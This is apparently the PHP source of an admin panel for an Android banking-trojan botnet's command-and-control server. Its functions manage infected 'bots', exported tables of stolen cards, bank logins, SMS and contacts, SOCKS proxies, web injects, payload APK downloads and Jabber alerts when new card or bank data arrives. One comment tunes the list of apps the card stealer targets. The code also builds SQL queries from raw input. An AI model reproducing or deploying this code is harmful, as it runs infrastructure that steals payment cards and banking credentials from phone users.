<?php
if(!defined('MODE')) hlp::show_404();

class CmdPanel {
	
	private $ajax;
	
	function __construct($ajax)
	{
		$this->ajax = $ajax;
		$this->db = $this->ajax->db;
		$this->client_cfg = $this->ajax->client_cfg;
	}

	function export_table($params)
	{
		$table = $params['table'];
		$sql = "select * from bot_" . $table;
		$rows = $this->db->exec($sql, null, true, PDO::FETCH_ASSOC);
		
		$data = 'no records';
		if($rows)
		{
			// header
			if($params['type'] == 'csv')
			{
				$data = "";
				$sql = "SELECT `COLUMN_NAME` FROM `INFORMATION_SCHEMA`.`COLUMNS` WHERE `TABLE_SCHEMA`='{$this->client_cfg['db_name']}' AND `TABLE_NAME`='bot_{$table}'";
				$cols = $this->db->exec($sql, null, true, PDO::FETCH_ASSOC);
				$data = "";
				foreach($cols as $col)
					$data .= $col['COLUMN_NAME'].";";
					
				$data .= "\n";
			}else
				$data = "";
				
			// data
			foreach($rows as $row)
			{
				if($params['type'] == 'csv') // text/csv
				{
					$tmp = '';
					foreach($row as $key=>$val)
					{
						$tmp .= $this->format_json($val, 'csv').";"; 
					}

					$data .= $tmp . "\n";
					
				}else{
					$keys = array_keys($row);
					$tmp = "\n\n";
					foreach($keys as $key)
					{
						$val = $this->format_json($row[$key], 'text');
						$tmp .= "{$key}: {$val}\n";
					}
					
					$data .= $tmp;
				}
			}
			
		}
		
		$sz = strlen($data);
		$d = date("d.m.Y_G-i");
		$name = "{$table}_{$d}.csv";

		$this->save_file($name, $sz, $data);
	}
	
	function format_json($data, $type)
	{
		if(!hlp::startsWith($data, "{") || !hlp::endsWith($data, "}"))
			return $data; 
			
		$x = json_decode($data, true);
		if($x === false)
			return $data;
		
		$out = '';
		
		foreach($x as $key=>$val)
		{
			if($type == 'csv')
				$out .= "{$key}:{$val},";
			else
				$out .= "\t- {$key}: {$val}\n";
		}
		
		return $out;
	}
	
	// Export file main function
	function save_file($name, $sz, $data)
	{
		header("Content-Type: application/x-force-download; name={$name}");
		header("Content-Disposition: attachment;filename={$name}\n");
		header("Expires: Tue, 11 Oct 1996 00:00:00 GMT\n");
		header("Accept-Ranges: bytes\n");
		header("Pragma: private\n");
		header("Cache-control: private\n");
		header("Content-Length: {$sz}\n\n");
		die($data);
	}
	
	function login($data)
	{
		// admin:test
		// insert into users values(null, "admin", "bbf66be60006c580fa7f68633680c5cc");
		$login = trim($data['login']);
		
		if(!trim($data['pass']) && strstr($login, ":"))
			list($login, $data['pass']) = explode(":", $login, 2);
			
		$pass = md5(trim($data['pass']) . PASSWORD_MD5_SALT);
		
		if(!preg_match('#[\S]{1,64}#', $login))
			$this->ajax->show_response("Incorrect login/password or&nbsp;blocked", "Error");
			
		$params = array(
			array(':login', $login, PDO::PARAM_STR, 64),
			array(':pass', $pass, PDO::PARAM_STR, 32),
		);
		
		sleep(1); // to prevent bruteforce
		$result = $this->db->exec("SELECT * FROM users WHERE login = :login AND password = :pass AND status='active'", $params, true);
		
		if(sizeof($result) != 1)
			$this->ajax->show_response("Incorrect login/password or&nbsp;blocked", "Error");
			
		$ip = hlp::get_client_ip();
		$sess_id = md5($login . $ip . PASSWORD_MD5_SALT);
		$params[] = array(':sessid', $sess_id, PDO::PARAM_STR, 32);
		$this->db->exec("UPDATE users SET sessid = :sessid WHERE login = :login AND password = :pass", $params);
		
		setcookie('login', $login);
		setcookie('sessid', $sess_id);
		
		$this->db->exec("UPDATE config SET value = '{$login}' WHERE name = 'last_login'", $params);
		
		$this->ajax->show_response("Welcome back, <span style='color: yellow'>{$login}</span>", "Success");
	}
	
	// Each method should has $this->ajax->show_response(text, title); !

	// data['type'] == 'bot', 'bot_number' 'sms', ...
	function save_comment($data)
	{
		if($data['type'] == 'bots' || $data['type'] == 'bot') // means that comment to Bot
		{
			$params = array(
				array(':id', $data['id'], PDO::PARAM_INT),
				array(':comment', $data['comment'], PDO::PARAM_STR, 128),
			);
			
			$this->db->exec("UPDATE bots SET comment = :comment WHERE id = :id", $params);
			
		}elseif($data['type'] == 'bot_number')
		{
			$params = array(
				array(':id', $data['id'], PDO::PARAM_INT),
				array(':number', $data['comment'], PDO::PARAM_STR, 15),
			);
			$this->db->exec("UPDATE bots SET number = :number WHERE id = :id", $params);
		}
		else if ($data['type'] == 'contact'){
			$params = array(
				array(':id', $data['id'], PDO::PARAM_INT),
				array(':comment', $data['comment'], PDO::PARAM_STR, 128),
			);
			$this->db->exec("UPDATE bot_contacts SET comment = :comment WHERE id = :id", $params);
		}
		else if ($data['type'] == 'cards'){
			$params = array(
				array(':id', $data['id'], PDO::PARAM_INT),
				array(':comment', $data['comment'], PDO::PARAM_STR, 128),
			);
			$this->db->exec("UPDATE bot_cards SET comment = :comment WHERE id = :id", $params);
		}
		else if ($data['type'] == 'banks'){
			$params = array(
				array(':id', $data['id'], PDO::PARAM_INT),
			);
			$this->db->exec("UPDATE bot_banks SET comment = :comment WHERE id = :id", $params);
		}
		
		//~ $this->ajax->show_response("type: {$data['type']}; comm: {$data['comment']}; bot_id: {$data['bot_id']}");
		$this->ajax->show_response("Saved", "SMALL_MSG");
	}
	
	function mark_manually($data)
	{
		$params = array(
			array(':bot_id', $data['bot_id'], PDO::PARAM_STR, 32),
		);

		if(hlp::get($data, "mode", '') == 'clean')
		{
			$val = 'null';
			$msg = "Marker has been removed";
		}else{
			$val = "NOW()";
			$msg = 'Bot has been marked manually';
		}
			
		$this->db->exec("UPDATE bots SET marked_at = {$val} WHERE bot_id = :bot_id", $params);
		$this->ajax->show_response($msg, 'SMALL_MSG');
	}
	
	function save_settings($data)
	{
		foreach($data as $key=>$val)
		{
			if(!hlp::startsWith($key, "cfg-"))
				continue;
			
			$real_key = substr($key, 4, strlen($key));
			
			if(hlp::endsWith($real_key, '_list'))
			{
				// CC stealer does not work on that shit 
				// because that shit runs in background from time to time
				if(strstr($real_key, "cc_on_apps_list"))
				{
					$val = str_replace("com.android.chrome", "", $val);
					$val = str_replace("com.android.vending", "", $val);
				}
					
				$val_arr = hlp::list2array($val, "\n");
				$val_arr = array_unique($val_arr);
				$val = implode("\n", $val_arr);
			}
			
			$sql = "update config set value=:value where name=:name";
			$params = array(
				array(':name', $real_key, PDO::PARAM_STR, 128),
				array(':value', trim($val), PDO::PARAM_STR),
			);
			$this->db->exec($sql, $params, false);
		}
		
		
		# increment data version
		$sql = 'update config set value = value + 1 where name = "data_version"';
		$this->db->exec($sql);
		
		$this->ajax->show_response("Settings saved", 'SMALL_MSG');
	}
	
	function cancel_task($data)
	{
		$sql = "update bot_tasks set status='cancelled' where status='pending'";
		
		if($data['records'] == 'ALL')
			$this->db->exec($sql);
		else
		{
			$ids = explode(",", $data['records']);
			$ids = array_map('intval', $ids);
			$this->db->exec_many($sql . " and id ?", $ids);
		}
		
		$this->ajax->show_response('Task has been cancelled', "SMALL_MSG");
	}
	
	function repeat_task($data)
	{
		$sql = "update bot_tasks set status='pending', response='', ts_end=null";
		
		if($data['records'] == 'ALL')
			$this->db->exec($sql);
		else
		{
			$ids = explode(",", $data['records']);
			$ids = array_map('intval', $ids);
			$this->db->exec_many($sql . " where id ?", $ids);
		}
		
		$this->ajax->show_response('Task has been updated', "SMALL_MSG");
	}
	
	function delete_task($data)
	{
		$sql = "delete from bot_tasks";
		
		if($data['records'] == 'ALL')
			$this->db->exec($sql);
		else
		{
			$ids = explode(",", $data['records']);
			$ids = array_map('intval', $ids);
			$this->db->exec_many($sql . " where id ?", $ids);
		}
		
		$this->ajax->show_response('Task has been deleted', "SMALL_MSG");
	}
	
	function delete_sms($data)
	{
		if($data['records'] == 'ALL')
			$this->db->exec("delete from bot_sms");
		else
		{
			$ids = explode(",", $data['records']);
			$ids = array_map('intval', $ids);
			$this->db->exec_many("delete from bot_sms where id ?", $ids);
		}
		
		$this->ajax->show_response('Done');
	}
	
	function delete_cards($data)
	{
		if($data['records'] == 'ALL')
			$this->db->exec("delete from bot_cards");
		else
		{
			$ids = explode(",", $data['records']);
			$ids = array_map('intval', $ids);
			$this->db->exec_many("delete from bot_cards where id ?", $ids);
		}
		
		$this->ajax->show_response('Done');
	}
	
	function delete_banks($data)
	{
		if($data['records'] == 'ALL')
			$this->db->exec("delete from bot_banks");
		else
		{
			$ids = explode(",", $data['records']);
			$ids = array_map('intval', $ids);
			$this->db->exec_many("delete from bot_banks where id ?", $ids);
		}
		
		$this->ajax->show_response('Done');
	}
	
	function delete_bot($data)
	{
		if($data['records'] == 'ALL')
		{
			$this->db->exec("delete from bot_apps");
			$this->db->exec("delete from apps");
			$this->db->exec("delete from bots");
			
			$this->db->exec("delete from bot_cards");
			$this->db->exec("delete from bot_banks");
			$this->db->exec("delete from bot_contacts");
			$this->db->exec("delete from bot_socks");
			$this->db->exec("delete from bot_sms");
			$this->ajax->show_response('Done');
			return;
		}

		$ids = explode(",", $data['records']);
		if($ids)
		foreach($ids as $bot_id)
		{

			$params = array(array(':bot_id', $bot_id, PDO::PARAM_STR, 32));
			
			$real_ids = $this->db->exec("select id from bots where bot_id=:bot_id", $params, true);
			if($real_ids)
			foreach($real_ids as $real_id)
			{
				$app_ids = $this->db->exec("select app_id from bot_apps where bot_id=:real_id", array(array(':real_id', $real_id, PDO::PARAM_STR, 32)), true);
				
				if($app_ids)
				foreach($app_ids as $app_id)
				{
					$this->db->exec("update apps set total_count = total_count - 1 where id=:app_id", array(array(':app_id', $app_id, PDO::PARAM_STR, 32)));
				}
			}
			
			$this->db->exec("delete from bot_apps where id in( select id from apps where total_count=0 ) ");
			
			$this->db->exec("delete from apps where total_count=0");
			
			$this->db->exec("delete from bots where bot_id=:bot_id", $params);

			$this->db->exec("delete from bot_cards where bot_id=:bot_id", $params);

			$this->db->exec("delete from bot_banks where bot_id=:bot_id", $params);
			
			$this->db->exec("delete from bot_contacts where bot_id=:bot_id", $params);
			
			$this->db->exec("delete from bot_sms where bot_id=:bot_id", $params);
			
			$this->db->exec("delete from bot_tasks where bot_id=:bot_id", $params);
			
		} // end foreach $ids
		
		$this->ajax->show_response('Done');
	}

	function delete_contacts($data){
		if ($data['records'] == 'ALL'){
			$this->db->exec("delete from bot_contacts");
		}
		else{
			$ids = explode(",", $data['records']);

			$this->db->exec_many("delete from bot_contacts where id ?", $ids);
		}

		$this->ajax->show_response('Done');
	}

	function stop_socks($data){
		$ids = explode(",", $data['records']);

		$this->db->exec_many("update {$this->client_cfg['db_main']}.bot_socks set is_online = 0 where id ?", $ids);

		$this->ajax->show_response('Done');
	}

	function download_apk($params)
	{
		$name = $params['name'];
		
		if(strstr($name, "/") || !hlp::endsWith($name, ".apk"))
			die;

		$path = dirname(__FILE__) . "/../../apks/{$name}";

		if(!file_exists($path))
			die;

		$data = file_get_contents($path);
		$sz = filesize($path);
		$this->save_file($name, $sz, $data);
	}

	function delete_account($data)
	{
		if($this->client_cfg['last_login'] != 'admin')
			die;

		$params = array(
			array(':id', $data['records'][0], PDO::PARAM_INT),
		);
		$sql = "delete from users where id=:id";
		$this->db->exec($sql, $params);
		$this->ajax->show_response('Done');
	}

	function enable_account($data)
	{
		if($this->client_cfg['last_login'] != 'admin')
			die;

		$params = array(
			array(':id', $data['records'][0], PDO::PARAM_INT),
		);
		$sql = "update users set status='active' where id=:id";
		$this->db->exec($sql, $params);
		$this->ajax->show_response('Done');
	}

	function disable_account($data)
	{
		if($this->client_cfg['last_login'] != 'admin')
			die;
			
		$params = array(
			array(':id', $data['records'][0], PDO::PARAM_INT),
		);
		$sql = "update users set status='disabled' where id=:id";
		$this->db->exec($sql, $params);
		$this->ajax->show_response('Done');
	}

	function disable_inject($data)
	{
		$params = array(
			array(':id', $data['inject_id'], PDO::PARAM_INT),
		);
		$sql = "update injects set active=false where id=:id";
		$this->db->exec($sql, $params);
		
		# increment data version
		$sql = 'update config set value = value + 1 where name = "data_version"';
		$this->db->exec($sql);
		
		$this->ajax->show_response('Done');
	}

	function enable_inject($data)
	{
		$params = array(
			array(':id', $data['inject_id'], PDO::PARAM_INT),
		);
		$sql = "update injects set active=true where id=:id";
		$this->db->exec($sql, $params);
		
		# increment data version
		$sql = 'update config set value = value + 1 where name = "data_version"';
		$this->db->exec($sql);
		
		$this->ajax->show_response('Done');
	}
	
	function add_account($data)
	{
		if($this->client_cfg['last_login'] != 'admin')
			die;
			
		$login = trim($data['login']);
		if($login == 'admin')
			$this->ajax->show_response('You can not add other admin', 'Error');
			
		$pass = md5(trim($data['pass']) . PASSWORD_MD5_SALT);
		
		if(!preg_match('#[\S]{1,64}#', $login))
			$this->ajax->show_response("Bad login format", "Error");

		$params = array(
			array(':login', $login, PDO::PARAM_STR, 64),
			array(':pass', $pass, PDO::PARAM_STR, 32),
		);
		
		$sql = "insert into users values(null, :login, :pass, '', 'active')";
		$this->db->exec($sql, $params);
		
		$this->ajax->show_response('Done');
	}
	
	function jabber_save($data, $skip=false)
	{

		$keys_allowed = array('jabber_login', 'jabber_pass', 'jabber_server', 'jabber_port', 'jabber_rcp', 'jabber_on_cards', 'jabber_on_banks', 'jabber_on_sms', 'jabber_on_tokens', 'jabber_on_coords', 'jabber_notifies_type', 'jabber_sms_numbers');

		if(isset($data['jabber_sms_numbers']))
		{
			$val_arr = hlp::list2array($data['jabber_sms_numbers'], "\n"); // Makes trim, skip empty values
			$arr2 = array();
			foreach($val_arr as $number)
			{
				$number = str_replace('-', '', str_replace(' ', '', trim($number)));

				if(!preg_match('#'.modBase::$filters['phone'].'#', $number))
					continue;
					
				$arr2[] = $number;
			}
			
			$arr2 = array_unique($arr2);
			$data['jabber_sms_numbers'] = implode("\n", $arr2);
		}
		
		if(isset($data['jabber_rcp']))
		{
			$val_arr = hlp::list2array($data['jabber_rcp'], "\n"); // Makes trim, skip empty values
			$val_arr = array_slice($val_arr, 0, 3); // 3 jabber addresses max allowed

			$arr2 = array();
			foreach($val_arr as $number)
			{
				$number = str_replace('-', '', str_replace(' ', '', trim($number)));

				if(!preg_match('#'.modBase::$filters['email'].'#', $number))
					continue;
				
				$arr2[] = $number;
			}
			
			$arr2 = array_unique($arr2);
			$data['jabber_rcp'] = implode("\n", $arr2);
		}

		if(isset($data['jabber_sms_numbers']) && !trim($data['jabber_sms_numbers']))
			$data['jabber_on_sms'] = 0;
			
		foreach($data as $key=>$val)
		{
			if(!in_array($key, $keys_allowed))
				continue;

			if($val === "true")
				$val = 1;
			elseif($val === "false")
				$val = 0;
			
			$sql = "replace into config(name, value) values(:name, :value)";
			$params = array(
				array(':name', $key, PDO::PARAM_STR, 128),
				array(':value', trim($val), PDO::PARAM_STR),
			);
			
			$this->db->exec($sql, $params, false);
		}

		if(!$skip)
			$this->ajax->show_response("Settings saved", 'SMALL_MSG');
	}
	
	function get_bot_details($data)
	{
		$params = array(
			array(':bot_id', $data['bot_id'], PDO::PARAM_STR, 32),
		);
		$sql = "select timestamp, comment, country, is_screen_enabled from bots where bot_id=:bot_id";
		$res = $this->db->exec($sql, $params, true)[0];
		$ts = $res['timestamp'];
		$screen_state = 'Screen: ' . (($res['is_screen_enabled'] == 1)? '<span style="color: darkgreen">Enabled</span>' : '<span style="color: darkred">Disabled</span>');
		$online = hlp::get_indicator($ts);
		$rowdate = hlp::human_date($ts);
		$flag = hlp::get_flag($res['country'], '', false);
		$details = <<<PHP
		<div class='row'>
			<div class='col-md-1'>{$flag}</div>
			<div class='col-md-11'>{$data['bot_id']}</div>
		</div>
		<div class='row'>
			<div class='col-md-1'>{$online}</div>
			<div class='col-md-11'>{$rowdate}</div>
		</div>
		<div class='row'>
			<div class='col-md-12'>{$screen_state}</div>
		</div>
PHP;

		if(trim($res['comment']) != '')
			$details .= <<<PHP
		<div class='row'>
			<div class='col-md-12' style='color: darkblue; font-style: italic'>"{$res['comment']}"</div>
		</div>
PHP;

		$this->ajax->show_response($details, "Bot info");
	}
	
	function jabber_test($data)
	{
		$this->jabber_save($data, true);
		
		include("jabber.php");
		
		$j = new Jabber($this->db);
		$j->connect();
		
		$rcps = $this->db->exec("select value from config where name='jabber_recepients'", null, true);
		
		if(!$rcps)
			$this->ajax->show_response("No recepients were defined");
			
		$n = 0;
		foreach(explode("\n", $rcps[0]['value']) as $rcp)
		{
			$j->send($rcp, "test #" . ++$n);
			if($n > 2)
				break;
		}
			
		$this->ajax->show_response("Test messages were send to {$n} addresses");
	}
	
	function stats($data)
	{
		if($data['action'] == 'clear')
		{
			$ts = time();
			$this->db->exec("insert into config values(null, 'guest_stats_cleared', '{$ts}') on duplicate key update value='{$ts}'");
		}else if($data['action'] == 'restore'){
			$this->db->exec("update config set value='' where name='guest_stats_cleared'");
		}
		
		$this->ajax->show_response("Done");
	}
	
}

















